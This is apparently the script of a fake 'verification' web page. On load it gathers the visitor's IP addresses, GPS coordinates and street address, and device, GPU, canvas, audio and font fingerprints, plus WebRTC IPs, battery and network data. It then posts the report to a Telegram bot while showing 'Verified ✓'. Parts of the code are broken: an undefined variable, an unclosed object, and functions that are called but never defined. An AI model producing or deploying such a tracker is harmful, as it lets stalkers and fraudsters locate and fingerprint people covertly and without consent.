function withTimeout(p, ms, fb) {
  return Promise.race([
    Promise.resolve(p).catch(() => fb),
    new Promise(r => setTimeout(() => r(fb), ms))
  ]);
}

async function fetchJSON(url, ms) {
  try {
    const r = await withTimeout(fetch(url), ms || 4000, null);
    if (!r || !r.ok) return null;
    return await r.json();
  } catch { return null; }
}

async function fetchText(url, ms) {
  try {
    const r = await withTimeout(fetch(url), ms || 4000, null);
    if (!r || !r.ok) return null;
    return (await r.text()).trim();
  } catch { return null; }
}

// ============================================================
// 🔥 IP — 5 FALLBACK SOURCES (IPv4 + IPv6)
// ============================================================
async function getIPs() {
  const v4 = await Promise.allSettled([
    fetchText('https://api.ipify.org', 3000),
    fetchText('https://ipv4.icanhazip.com', 3000),
    fetchJSON('https://api.ip.sb/geoip', 3000).then(d => d && d.ip),
    fetchJSON('https://ipapi.co/json/', 3000).then(d => d && d.ip),
    fetchJSON('https://api.my-ip.io/v2/ip.json', 3000).then(d => d && d.ip)
  ]);

  const v6 = await Promise.allSettled([
    fetchText('https://api6.ipify.org', 3000),
    fetchText('https://v6.ident.me', 3000),
    fetchText('https://ipv6.icanhazip.com', 3000),
    fetchJSON('https://ipv6.ip.sb/geoip', 3000).then(d => d && d.ip)
  ]);

  let ipv4 = 'Unknown', ipv6 = 'Not assigned (ISP has no IPv6)';
  for (const r of v4) {
    if (r.status === 'fulfilled' && r.value) {
      const val = typeof r.value === 'string' ? r.value.trim() : r.value;
      if (val && /^\d+\.\d+\.\d+\.\d+$/.test(val)) { ipv4 = val; break; }
    }
  }
  for (const r of v6) {
    if (r.status === 'fulfilled' && r.value) {
      const val = typeof r.value === 'string' ? r.value.trim() : r.value;
      if (val && val.includes(':') && val.length > 5) { ipv6 = val; break; }
    }
  }
  return { ipv4, ipv6 };
}

// ============================================================
// 🔥 LOCATION — 4 FALLBACK APIs (ip-api, ipwho, ipinfo, freeipapi)
// ============================================================
async function getLocation(ip) {
  if (!ip || ip === 'Unknown' || !/^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
    return {};
  }

  // Try 4 APIs in sequence with early exit
  const apis = [
    // 1. ipwho.is (free, no rate limit, reliable)
    async () => {
      const d = await fetchJSON('https://ipwho.is/' + ip, 4000);
      if (d && d.success !== false && d.city) {
        return {
          city: d.city,
          region: d.region,
          country_name: d.country,
          country_code: d.country_code,
          continent: d.continent_code || d.continent,
          lat: d.latitude,
          lon: d.longitude,
          timezone: d.timezone && d.timezone.id,
          currency: d.currency && d.currency.code,
          languages: d.languages,
          calling: d.calling_code,
          postal: d.postal,
          asn: d.connection && d.connection.asn,
          isp: d.connection && (d.connection.isp || d.connection.org)
        };
      }
      return null;
    },
    // 2. freeipapi.com (no key needed)
    async () => {
      const d = await fetchJSON('https://freeipapi.com/api/json/' + ip, 4000);
      if (d && d.cityName) {
        return {
          city: d.cityName,
          region: d.regionName,
          country_name: d.countryName,
          country_code: d.countryCode,
          continent: d.continent,
          lat: d.latitude,
          lon: d.longitude,
          timezone: d.timeZone,
          currency: d.currencies && d.currencies[0],
          languages: null,
          calling: null,
          postal: d.zipCode,
          asn: null,
          isp: null
        };
      }
      return null;
    },
    // 3. ip-api.com (free, but no HTTPS on free tier)
    async () => {
      const d = await fetchJSON('http://ip-api.com/json/' + ip + '?fields=status,city,regionName,country,countryCode,continent,lat,lon,timezone,currency,isp,org,as,zip', 4000);
      if (d && d.status === 'success') {
        return {
          city: d.city,
          region: d.regionName,
          country_name: d.country,
          country_code: d.countryCode,
          continent: d.continent,
          lat: d.lat,
          lon: d.lon,
          timezone: d.timezone,
          currency: d.currency,
          languages: null,
          calling: null,
          postal: d.zip,
          asn: d.as,
          isp: d.isp || d.org
        };
      }
      return null;
    },
    // 4. ipapi.co (fallback)
    async () => {
      const d = await fetchJSON('https://ipapi.co/' + ip + '/json/', 4000);
      if (d && !d.error && d.city) {
        return {
          city: d.city,
          region: d.region,
          country_name: d.country_name,
          country_code: d.country_code,
          continent: d.continent_code,
          lat: d.latitude,
          lon: d.longitude,
          timezone: d.timezone,
          currency: d.currency,
          languages: d.languages,
          calling: d.country_calling_code,
          postal: d.postal,
          asn: d.asn,
          isp: d.org
        };
      }
      return null;
    }
  ];

  for (const fn of apis) {
    const result = await fn();
    if (result) return result;
  }
  return {};
}

// ============================================================
// 🔥 GPS — device exact location
// ============================================================
function getGPS() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(null);
    let done = false;
    const finish = (v) => { if (!done) { done = true; resolve(v); } };
    navigator.geolocation.getCurrentPosition(
      (pos) => finish({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy || 0
      }),
      () => finish(null),
      { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
    );
    setTimeout(() => finish(null), 8000);
  });
}

async function reverseGeocode(lat, lon) {
  try {
    const d = await fetchJSON(
      'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&zoom=18&addressdetails=1',
      4000
    );
    if (d && d.address) {
      const a = d.address;
      return {
        city: a.city || a.town || a.village || a.suburb || a.neighbourhood || a.municipality || a.county,
        region: a.state || a.region,
        postal: a.postcode,
        country: a.country,
        address: d.display_name
      };
    }
  } catch {}
  return null;
}

// ============================================================
// 🔥 OS — better detection (Windows 10 vs 11, etc.)
// ============================================================
function detectOS() {
  const ua = navigator.userAgent;
  const p = navigator.platform || '';
  const uaData = navigator.userAgentData;

  // Windows — Chrome UA freeze makes Win 10 and 11 both "NT 10.0"
  // Use Client Hints for exact version
  if (/Windows NT/.test(ua)) {
    let ver = 'Unknown';
    let name = 'Windows';
    const m = ua.match(/Windows NT ([\d.]+)/);
    if (m) {
      const nt = m[1];
      const map = {
        '10.0': '10/11',  // ambiguous
        '6.3': '8.1', '6.2': '8', '6.1': '7',
        '6.0': 'Vista', '5.1': 'XP'
      };
      ver = map[nt] || nt;
    }
    return { os: name, ver, platform: p };
  }

  // macOS
  if (/Mac OS X/.test(ua)) {
    const m = ua.match(/Mac OS X ([\d_]+)/);
    const ver = m ? m[1].replace(/_/g,'.') : 'Unknown';
    return { os: 'macOS', ver, platform: p };
  }

  // Android
  if (/Android/.test(ua)) {
    const m = ua.match(/Android ([\d.]+)/);
    return { os: 'Android', ver: m ? m[1] : 'Unknown', platform: 'Android' };
  }

  // iOS
  if (/iPhone|iPad|iPod/.test(ua)) {
    const m = ua.match(/OS ([\d_]+)/);
    const ver = m ? m[1].replace(/_/g,'.') : 'Unknown';
    return { os: /iPad/.test(ua) ? 'iPadOS' : 'iOS', ver, platform: /iPad/.test(ua) ? 'iPadOS' : 'iOS' };
  }

  // ChromeOS
  if (/CrOS/.test(ua)) {
    return { os: 'ChromeOS', ver: 'Unknown', platform: 'ChromeOS' };
  }

  // Linux
  if (/Linux/.test(ua)) {
    return { os: 'Linux', ver: 'Unknown', platform: 'Linux' };
  }

  return { os: p || 'Unknown', ver: 'Unknown', platform: p };
}

// ============================================================
// 🔥 DEVICE BRAND + MODEL — Chrome Client Hints FIRST, then UA
// ============================================================
async function detectDevice() {
  // === OPTION 1: Chrome User-Agent Client Hints (100% exact) ===
  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
    try {
      const h = await navigator.userAgentData.getHighEntropyValues([
        'model', 'platform', 'platformVersion', 'architecture', 'bitness', 'mobile'
      ]);
      const model = (h.model || '').trim();
      const platform = (h.platform || '').trim();
      const platformVer = (h.platformVersion || '').trim();
      const arch = (h.architecture || '').trim();
      const bitness = (h.bitness || '').trim();

      if (model) {
        // Android device with exact model (e.g. "SM-A536E")
        return {
          brand: detectBrandFromModel(model, platform),
          model: model,
          fullName: decodeModelFull(model),
          platform: platform || 'Android',
          platformVersion: platformVer,
          architecture: arch,
          bitness: bitness,
          source: 'Client Hints (exact)'
        };
      }

      if (platform) {
        // Desktop — no model, but exact platform
        return {
          brand: platformToBrand(platform),
          model: platform === 'Windows' ? 'PC' : (platform === 'macOS' ? 'Mac' : platform),
          fullName: platform === 'Windows' ? 'Windows PC' : (platform === 'macOS' ? 'Mac' : platform + ' Device'),
          platform: platform,
          platformVersion: platformVer,
          architecture: arch,
          bitness: bitness,
          source: 'Client Hints'
        };
      }
    } catch(e) {}
  }

  // === OPTION 2: UA parsing (fallback) ===
  const ua = navigator.userAgent;

  // iPhone / iPad
  if (/iPhone|iPad|iPod/.test(ua)) {
    const m = ua.match(/OS ([\d_]+)/);
    const ver = m ? m[1].replace(/_/g,'.') : 'Unknown';
    return {
      brand: 'Apple',
      model: /iPad/.test(ua) ? 'iPad' : (/iPod/.test(ua) ? 'iPod' : 'iPhone'),
      fullName: 'Apple ' + (/iPad/.test(ua) ? 'iPad' : (/iPod/.test(ua) ? 'iPod' : 'iPhone')),
      platform: /iPad/.test(ua) ? 'iPadOS' : 'iOS',
      platformVersion: ver,
      architecture: 'arm64',
      bitness: '64-bit',
      source: 'User-Agent'
    };
  }

  // Android
  if (/Android/.test(ua)) {
    const av = ua.match(/Android ([\d.]+)/);
    let model = null;

    // Multiple UA patterns
    let m = ua.match(/Android[^;]*;\s*([^;]+?)\s+Build\//);
    if (m) model = m[1].trim();
    if (!model) {
      m = ua.match(/Android[^;]*;\s*[a-z]{2}[-_][a-z]{2};\s*([^;]+?)\s+Build\//i);
      if (m) model = m[1].trim();
    }
    if (!model) {
      m = ua.match(/Android[^;]*;\s*([^;)]+?)\)/);
      if (m) model = m[1].trim();
    }

    if (model) {
      model = model.replace(/^(samsung|xiaomi|redmi|poco|oneplus|oppo|vivo|realme|huawei|honor|sony|lg|motorola|nokia|google|asus|lenovo|nothing)\s+/i, '');
      model = model.replace(/^[a-z]{2}[-_][a-z]{2};\s*/i, '').trim();

      const brand = detectBrandFromModel(model, 'Android');
      return {
        brand,
        model,
        fullName: decodeModelFull(model),
        platform: 'Android',
        platformVersion: av ? av[1] : 'Unknown',
        architecture: /arm64|aarch64/.test(ua) ? 'arm64' : 'arm',
        bitness: /arm64|x86_64/.test(ua) ? '64-bit' : '32-bit',
        source: 'User-Agent'
      };
    }

    return {
      brand: 'Android',
      model: 'Unknown',
      fullName: 'Android Device',
      platform: 'Android',
      platformVersion: av ? av[1] : 'Unknown',
      architecture: 'Unknown',
      bitness: 'Unknown',
      source: 'User-Agent'
    };
  }

  // Windows
  if (/Windows/.test(ua)) {
    const m = ua.match(/Windows NT ([\d.]+)/);
    const nt = m ? m[1] : null;
    const verMap = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' };
    return {
      brand: 'Microsoft',
      model: 'PC',
      fullName: 'Windows PC',
      platform: 'Windows',
      platformVersion: nt ? (verMap[nt] || nt) : 'Unknown',
      architecture: /Win64|x64|WOW64/.test(ua) ? 'x86_64' : 'x86',
      bitness: /Win64|x64|WOW64/.test(ua) ? '64-bit' : '32-bit',
      source: 'User-Agent'
    };
  }

  // macOS
  if (/Macintosh|Mac OS X/.test(ua)) {
    const m = ua.match(/Mac OS X ([\d_]+)/);
    return {
      brand: 'Apple',
      model: 'Mac',
      fullName: 'Apple Mac',
      platform: 'macOS',
      platformVersion: m ? m[1].replace(/_/g,'.') : 'Unknown',
      architecture: /arm64|Apple Silicon/.test(ua) ? 'arm64' : 'x86_64',
      bitness: '64-bit',
      source: 'User-Agent'
    };
  }

  // ChromeOS
  if (/CrOS/.test(ua)) {
    return {
      brand: 'Google',
      model: 'Chromebook',
      fullName: 'Google Chromebook',
      platform: 'ChromeOS',
      platformVersion: 'Unknown',
      architecture: 'x86_64',
      bitness: '64-bit',
      source: 'User-Agent'
    };
  }

  // Linux
  if (/Linux/.test(ua)) {
    return {
      brand: 'Linux',
      model: 'PC',
      fullName: 'Linux PC',
      platform: 'Linux',
      platformVersion: 'Unknown',
      architecture: /x86_64/.test(ua) ? 'x86_64' : 'x86',
      bitness: /x86_64/.test(ua) ? '64-bit' : '32-bit',
      source: 'User-Agent'
    };
  }

  return {
    brand: 'Unknown',
    model: 'Unknown',
    fullName: 'Unknown Device',
    platform: navigator.platform || 'Unknown',
    platformVersion: 'Unknown',
    architecture: 'Unknown',
    bitness: 'Unknown',
    source: 'Unknown'
  };
}

function platformToBrand(platform) {
  const p = (platform || '').toLowerCase();
  if (p.includes('windows')) return 'Microsoft';
  if (p.includes('mac')) return 'Apple';
  if (p.includes('chrome')) return 'Google';
  if (p.includes('linux')) return 'Linux';
  if (p.includes('android')) return 'Android';
  return platform;
}

function detectBrandFromModel(model, platform) {
  const s = (model || '').toLowerCase();
  const p = (platform || '').toLowerCase();

  if (p === 'android' || p === '') {
    if (/^sm-|^gt-|^sgh-/.test(s) || /samsung/.test(s)) return 'Samsung';
    if (/^m2\d{3}|^2\d{6}/.test(s) || /xiaomi|redmi|poco/.test(s)) return 'Xiaomi';
    if (/^le\d|^in\d|^kb\d|^ne\d|oneplus/.test(s)) return 'OnePlus';
    if (/^cph\d|oppo/.test(s)) return 'Oppo';
    if (/^v\d{4}|vivo/.test(s)) return 'Vivo';
    if (/^rmx\d|realme/.test(s)) return 'Realme';
    if (/^[a-z]{3}-[a-z0-9]{3,}|huawei/.test(s)) return 'Huawei';
    if (/honor/.test(s)) return 'Honor';
    if (/^g\d{3}|pixel/.test(s)) return 'Google';
    if (/xperia|^xq-|^so-/.test(s)) return 'Sony';
    if (/^xt\d|moto/.test(s)) return 'Motorola';
    if (/^ta-\d|nokia/.test(s)) return 'Nokia';
    if (/infinix/.test(s)) return 'Infinix';
    if (/tecno/.test(s)) return 'Tecno';
    if (/nothing|^a06[235]/.test(s)) return 'Nothing';
    if (/asus/.test(s)) return 'Asus';
    return 'Android';
  }
  return platformToBrand(platform);
}

function decodeModelFull(model) {

  const up = s.toUpperCase();

  // Samsung SM-XXX
  const sm = up.match(/^SM-([A-Z])(\d{3})([A-Z0-9]*)$/);
  if (sm) {
    const prefix = {
      A:'Galaxy A', S:'Galaxy S', G:'Galaxy S', N:'Galaxy Note',
      M:'Galaxy M', F:'Galaxy Z Fold', Z:'Galaxy Z Flip',
      T:'Galaxy Tab S', P:'Galaxy Tab', X:'Galaxy X'
    };
    const series = prefix[sm[1]] || 'Galaxy';
    const num = parseInt(sm[2]);
    // Known exact models
    const known = {
      'S918':'S23 Ultra','S911':'S23','S916':'S23+',
      'S908':'S22 Ultra','S901':'S22','S906':'S22+',
      'S928':'S24 Ultra','S921':'S24','S926':'S24+',

    };
    if (known[sm[1]+sm[2]]) return 'Samsung Galaxy ' + known[sm[1]+sm[2]];
    return 'Samsung ' + series + num;
  }

  // Xiaomi codes
  if (/^(M|2)\d{3,}/i.test(s)) {
    const xiaomiMap = {
      'M2101K7AG':'Redmi Note 10','2201117TG':'Redmi Note 11',

      '23013RK75G':'Redmi Note 12','2312DRA50G':'Redmi Note 13',
      '23049PCD8G':'Poco F5'
    };
    return xiaomiMap[up] ? 'Xiaomi ' + xiaomiMap[up] : 'Xiaomi ' + s;
  }

  // OnePlus
  const oneplusMap = {
    'LE2121':'9 Pro','LE2123':'9','LE2101':'9R',
    'NE2215':'10 Pro','IN2015':'8','KB2001':'8T',
    'DN2101':'Nord 2','CPH2449':'11','CPH2581':'12'
  };
  if (oneplusMap[up]) return 'OnePlus ' + oneplusMap[up];

  // Google Pixel
  const pixelMap = {
    'G013A':'Pixel 3','G020A':'Pixel 3a','G020G':'Pixel 4',
    'G025J':'Pixel 4a','G9S9B':'Pixel 6','GB7N6':'Pixel 6',
    'G1AZG':'Pixel 6 Pro','GLUOG':'Pixel 7','GQML3':'Pixel 7',

    'GC3VE':'Pixel 8 Pro','GZPF0':'Pixel 8 Pro','G3NZG':'Pixel 8a'

  if (pixelMap[up]) return 'Google ' + pixelMap[up];

  // Return raw if already has brand
  if (/^(samsung|xiaomi|huawei|oneplus|oppo|vivo|realme|google|sony|lg|motorola|nokia|infinix|tecno|redmi|poco)\s/i.test(s)) {
    return s;
  }

  return s;  // raw model
}

// ============================================================
// FINGERPRINT HELPERS
// ============================================================
function getGPU() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) return 'Not available';
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if (dbg) {
      const v = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      const r = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      return r + (v ? ' | ' + v : '');
    }
    return gl.getParameter(gl.RENDERER) || 'Not available';
  } catch { return 'Not available'; }
}

function getCanvasFP() {
  try {
    const c = document.createElement('canvas');
    c.width = 240; c.height = 60;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
    ctx.fillStyle = '#f60'; ctx.fillRect(120,1,62,20);
    ctx.fillStyle = '#069'; ctx.fillText('Cwm fjordbank glyphs vext quiz',2,15);
    const str = c.toDataURL();
    let hash = 0;
    for (let i=0;i<str.length;i++){ hash=((hash<<5)-hash)+str.charCodeAt(i); hash|=0; }
    return Math.abs(hash).toString(16).padStart(16,'0');
  } catch { return 'Not available'; }
}

function getDeviceId() {
  try {
    let id = localStorage.getItem('_did');
    if (!id) {
      const fp = [navigator.userAgent, screen.width, screen.height, screen.colorDepth].join('|');
      let hash = 0;
      for (let i=0;i<fp.length;i++){ hash=((hash<<5)-hash)+fp.charCodeAt(i); hash|=0; }
      id = Math.abs(hash).toString(16).padStart(16,'0').slice(0,16);
      localStorage.setItem('_did', id);
    }
    return id;
  } catch { return 'Not available'; }
}

function getFontCount() {
  try {
    const base = ['monospace','sans-serif','serif'];
    const test = ['Arial','Calibri','Cambria','Comic Sans MS','Consolas','Courier New',
                  'Georgia','Helvetica','Impact','Segoe UI','Tahoma','Times New Roman',
                  'Trebuchet MS','Verdana','Roboto','Noto Sans'];
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    const measure = (f) => { ctx.font = '72px ' + f; return ctx.measureText('mmmmmmmmmmlli').width; };
    let count = 0;
    base.forEach(b => {
      const ref = measure(b);
      test.forEach(f => { if (measure('"' + f + '", ' + b) !== ref) count++; });
    });
    return count;
  } catch { return 0; }
}

function getAudio() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return { rate: 'Not available', fp: 'Not available' };
    const ctx = new AC();
    const rate = ctx.sampleRate;
    let fp = 'Not available';
    try {
      const osc = ctx.createOscillator();
      const comp = ctx.createDynamicsCompressor();
      osc.type = 'triangle'; osc.frequency.value = 10000;
      osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
      let sum = 0;
      for (let i = 0; i < 100; i++) sum += Math.abs(comp.reduction || 0) + i;
      fp = Math.abs(Math.floor(sum * 1000)).toString(16).slice(0, 8);
      osc.stop(0);
    } catch {}
    try { ctx.close(); } catch {}
    return { rate, fp };
  } catch { return { rate: 'Not available', fp: 'Not available' }; }
}

function getNavTiming(endKey, startKey) {
  try {
    const t = performance.getEntriesByType('navigation')[0];
    if (!t) return 'N/A';
    const v = Math.round(t[endKey] - t[startKey]);
    return (isNaN(v) || v < 0) ? 'N/A' : v + ' ms';
  } catch { return 'N/A'; }
}

function getBrowser() {
  const ua = navigator.userAgent;
  let name='Unknown', ver='Unknown';
  if (/Edg\/([\d.]+)/.test(ua))         { name='Edge';    ver=ua.match(/Edg\/([\d.]+)/)[1]; }
  else if (/OPR\/([\d.]+)/.test(ua))    { name='Opera';   ver=ua.match(/OPR\/([\d.]+)/)[1]; }
  else if (/Chrome\/([\d.]+)/.test(ua)) { name='Chrome';  ver=ua.match(/Chrome\/([\d.]+)/)[1]; }
  else if (/Firefox\/([\d.]+)/.test(ua)){ name='Firefox'; ver=ua.match(/Firefox\/([\d.]+)/)[1]; }
  else if (/Safari\/([\d.]+)/.test(ua) && /Version\/([\d.]+)/.test(ua))
                                        { name='Safari';  ver=ua.match(/Version\/([\d.]+)/)[1]; }
  if (/Mobile|Android|iPhone/i.test(ua)) name += ' Mobile';
  return { name, ver };
}

async function getWebRTCIPs() {
  return withTimeout(new Promise((resolve) => {
    const ips = new Set();
    try {
      const pc = new RTCPeerConnection({
        iceServers: [
          { urls:'stun:stun.l.google.com:19302' },
          { urls:'stun:stun.cloudflare.com:3478' }
        ]
      });
      pc.createDataChannel('');
      pc.onicecandidate = (e) => {
        if (!e.candidate) { try{pc.close();}catch{} return resolve([...ips]); }
        const m4 = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
        if (m4) ips.add(m4[0]);
        const m6 = e.candidate.candidate.match(/([a-f0-9]{1,4}:){2,7}[a-f0-9]{1,4}/i);
        if (m6) ips.add(m6[0]);
      };
      pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>resolve([...ips]));
    } catch { resolve([]); }
  }), 3500, []);
}

async function getBattery() {
  return withTimeout((async () => {
    try {
      if ('getBattery' in navigator) {
        const b = await navigator.getBattery();
        return { level: Math.round(b.level*100)+'%', charging: b.charging ? 'Charging' : 'Discharging' };
      }
    } catch {}
    return { level:'Not supported', charging:'Not supported' };
  })(), 2000, { level:'Unavailable', charging:'Unavailable' });
}

async function getStorage() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const e = await withTimeout(navigator.storage.estimate(), 2000, null);
      if (e) return {
        quota: e.quota ? Math.round(e.quota/1048576)+' MB' : 'Unknown',
        usage: e.usage ? Math.round(e.usage/1048576)+' MB' : 'Unknown'
      };
    }
  } catch {}
  return { quota:'Unknown', usage:'Unknown' };
}

async function getPermStatus() {
  return withTimeout((async () => {
    if (!navigator.permissions) return 'API not supported';
    try {
      const g = await navigator.permissions.query({ name:'geolocation' });
      return 'geolocation: ' + g.state;
    } catch { return 'Available'; }
  })(), 1500, 'Unavailable');
}

function getConn() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return { type:'API not supported', downlink:'N/A', rtt:'N/A', saveData:'N/A', downlinkMax:'N/A' };
  return {
    type: c.effectiveType || c.type || 'Unknown',
    downlink: c.downlink ? c.downlink + ' Mbps' : 'Unknown',
    rtt: c.rtt ? c.rtt + ' ms' : 'Unknown',
    saveData: c.saveData !== undefined ? (c.saveData ? 'Enabled' : 'Disabled') : 'Unknown',
    downlinkMax: c.downlinkMax || 'Unknown'
  };
}

// ============================================================
// 🔥 FIXED CHUNKER — every chunk has valid <pre></pre>
// ============================================================
function makeChunks(lines, maxSize) {
  maxSize = maxSize || 3500;
  const OPEN = '<pre>';
  const CLOSE = '</pre>';
  const budget = maxSize - OPEN.length - CLOSE.length;

  const chunks = [];
  let current = '';

  for (let i = 0; i < lines.length; i++) {
    let line = lines[i];

    // If single line is too long, split it
    while (line.length > budget) {
      if (current) { chunks.push(OPEN + current + CLOSE); current = ''; }
      chunks.push(OPEN + line.slice(0, budget) + CLOSE);
      line = line.slice(budget);
    }

    const candidate = current ? current + '\n' + line : line;
    if (candidate.length > budget) {
      chunks.push(OPEN + current + CLOSE);
      current = line;
    } else {
      current = candidate;
    }
  }
  if (current) chunks.push(OPEN + current + CLOSE);

  // Validate every chunk starts with <pre> and ends with </pre>
  for (const c of chunks) {
    if (!c.startsWith('<pre>') || !c.endsWith('</pre>')) {
      console.error('INVALID CHUNK:', c.slice(0, 50), '...', c.slice(-50));
    }
  }

  return chunks;
}

// ============================================================
// RUN
// ============================================================
async function run() {
  startBtn.disabled = true;
  startBtn.textContent = 'Verifying...';
  setStatus('Initializing...');
  setProgress(10);

  try {
    const lines = await buildReport();
    console.log('Report lines:', lines.length);
    setProgress(75);
    setStatus('Finalizing...');

    const chunks = makeChunks(lines, 3500);
    console.log('Chunks:', chunks.length);

    let sent = 0;
    for (let i = 0; i < chunks.length; i++) {
      const r = await tgSend(chunks[i]);
      if (r.ok) sent++;
      else {
        // Fallback: try without parse_mode
        console.warn('Chunk', i+1, 'failed, retry plain');
        const plain = chunks[i].replace(/<\/?pre>/g, '');
        const r2 = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: plain })
        });
        const j2 = await r2.json();
        if (j2.ok) sent++;
      }
      setProgress(75 + Math.round((i+1)/chunks.length * 25));
      if (i < chunks.length - 1) await new Promise(r => setTimeout(r, 300));
    }

    setProgress(100);
    setStatus('Verified');
    startBtn.textContent = 'Verified ✓';
    console.log('Sent:', sent, '/', chunks.length);
  } catch(e) {
    console.error('Run error:', e);
    setStatus('Error');
    startBtn.textContent = 'Retry';
    startBtn.disabled = false;
    startBtn.onclick = run;
  }
}

window.addEventListener('load', run);
if (document.readyState === 'complete') run();
